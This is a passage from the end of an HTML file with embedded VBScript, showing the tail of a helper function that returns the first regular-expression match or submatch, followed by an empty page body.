            RegexFirst = m(0).SubMatches(0)
        Else
            RegexFirst = m(0).Value
        End If
    Else
        RegexFirst = ""
    End If
    Set rx = Nothing
End Function
</script>
</head><body></body></html>
